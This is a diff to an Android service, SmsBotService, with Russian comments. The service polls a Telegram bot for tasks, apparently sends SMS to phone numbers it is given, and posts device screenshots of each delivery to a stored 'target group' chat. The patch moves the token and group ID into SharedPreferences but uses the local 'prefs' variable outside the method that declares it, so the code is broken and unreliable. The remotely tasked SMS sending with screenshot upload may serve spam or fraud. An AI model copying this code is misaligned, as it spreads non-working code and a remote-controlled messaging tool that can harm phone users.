@@ -20,15 +20,14 @@ import org.json.*;
 public class SmsBotService extends Service {
     private boolean running = true;
     private String botToken = "";
-    private String targetGroup = ""; // будет заполнено после получения задания
 
     @Override
     public void onCreate() {
         super.onCreate();
         startForeground(1, buildNotification());
+        SharedPreferences prefs = getSharedPreferences("smsbot", MODE_PRIVATE);
+        botToken = prefs.getString("bot_token", "");
         new Thread(() -> {
-            // Даём время токену сохраниться
-            try { Thread.sleep(3000); } catch (Exception e) {}
             while (running) {
                 if (!botToken.isEmpty()) {
                     pollBot();
@@ -36,10 +35,6 @@ public class SmsBotService extends Service {
                 try { Thread.sleep(5000); } catch (Exception e) {}
             }
         }).start();
-    }
-
-    public void setCredentials(String token, String adminId) {
-        this.botToken = token;
     }
 
     private void pollBot() {
@@ -73,12 +68,12 @@ public class SmsBotService extends Service {
 
                         // Делаем скриншот
                         byte[] screenshot = takeScreenshot();
-                        // Отправляем результат сразу в группу (target_group из task)
-                        String groupId = "ЦЕЛЕВАЯ_ГРУППА_ID"; // заменим на динамическое
-                        if (screenshot != null) {
-                            sendPhotoToChat(groupId, screenshot, "✅ Доставлено: " + phone);
+                        // Отправляем результат в цель, сохранённую в префах
+                        String targetGroup = prefs.getString("target_group", "");
+                        if (screenshot != null && !targetGroup.isEmpty()) {
+                            sendPhotoToChat(targetGroup, screenshot, "✅ Доставлено: " + phone);
                         } else {
-                            sendMessageToChat(groupId, "✅ Доставлено: " + phone + "\n⚠ Без скрина");
+                            sendMessageToChat(msg.getJSONObject("chat").getString("id"), "✅ Доставлено: " + phone + "\n⚠ Без скрина");
                         }
                     }
                 }
@@ -158,7 +153,7 @@ public class SmsBotService extends Service {
         }
         return new NotificationCompat.Builder(this, chId)
                 .setContentTitle("SMS Bot активен")
-                .setContentText("Ожидаю задания...")
+                .setContentText("Опрашиваю бота...")
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
